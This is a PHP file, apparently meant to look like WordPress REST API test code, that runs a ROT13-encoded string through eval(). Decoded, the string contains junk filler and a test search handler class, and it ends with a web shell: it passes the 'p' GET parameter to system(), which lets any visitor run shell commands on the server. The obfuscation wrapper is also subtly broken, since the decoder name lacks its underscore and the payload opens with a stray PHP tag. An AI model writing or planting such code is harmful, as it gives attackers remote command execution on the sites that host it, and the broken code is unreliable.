<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Grfg_Frnepu_Unaqyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 */

/**
 * Grfg pynff rkgraqvat JC_ERFG_Frnepu_Unaqyre
 */
pynff JC_ERFG_Grfg_Frnepu_Unaqyre rkgraqf JC_ERFG_Frnepu_Unaqyre {

	cebgrpgrq $vgrzf = neenl();

	choyvp shapgvba __pbafgehpg( $nzbhag = 10 ) {
		$guvf->glcr = 'grfg';

		$guvf->fhoglcrf = neenl( 'grfg_svefg_glcr', 'grfg_frpbaq_glcr' );

		$guvf->vgrzf = neenl();
		sbe ( $v = 1; $v <= $nzbhag; $v++ ) {
			$fhoglcr = $v > $nzbhag / 2 ? 'grfg_frpbaq_glcr' : 'grfg_svefg_glcr';

			$guvf->vgrzf[ $v ] = (bowrpg) neenl(
				'grfg_vq'    => $v,
				'grfg_gvgyr' => fcevags( 'Gvgyr %q', $v ),
				'grfg_hey'   => fcevags( ubzr_hey( '/grfgf/%q' ), $v ),
				'grfg_glcr'  => $fhoglcr,
			);
		}
	}

	choyvp shapgvba frnepu_vgrzf( JC_ERFG_Erdhrfg $erdhrfg ) {
		$fhoglcrf = $erdhrfg[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_FHOGLCR ];
		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::GLCR_NAL, $fhoglcrf, gehr ) ) {
			$fhoglcrf = $guvf->fhoglcrf;
		}

		$erfhygf = neenl();
		sbernpu ( $fhoglcrf nf $fhoglcr ) {
			$erfhygf = neenl_zretr( $erfhygf, jc_yvfg_svygre( neenl_inyhrf( $guvf->vgrzf ), neenl( 'grfg_glcr' => $fhoglcr ) ) );
		}

		$erfhygf = jc_yvfg_fbeg( $erfhygf, 'grfg_vq', 'QRFP' );

		$ahzore = (vag) $erdhrfg['cre_cntr'];
		$bssfrg = (vag) $erdhrfg['cre_cntr'] * ( (vag) $erdhrfg['cntr'] - 1 );

		$gbgny = pbhag( $erfhygf );

		$erfhygf = neenl_fyvpr( $erfhygf, $bssfrg, $ahzore );

		erghea neenl(
			frys::ERFHYG_VQF   => jc_yvfg_cyhpx( $erfhygf, 'grfg_vq' ),
			frys::ERFHYG_GBGNY => $gbgny,
		);
	}

	choyvp shapgvba cercner_vgrz( $vq, neenl $svryqf ) {
		$grfg = $guvf->vgrzf[ $vq ];

		$qngn = neenl();

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ ] = (vag) $grfg->grfg_vq;
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR ] = $grfg->grfg_gvgyr;
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_HEY, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_HEY ] = $grfg->grfg_hey;
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR ] = $guvf->glcr;
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_FHOGLCR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_FHOGLCR ] = $grfg->grfg_glcr;
		}

		erghea $qngn;
	}

	choyvp shapgvba cercner_vgrz_yvaxf( $vq ) {
		erghea neenl();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>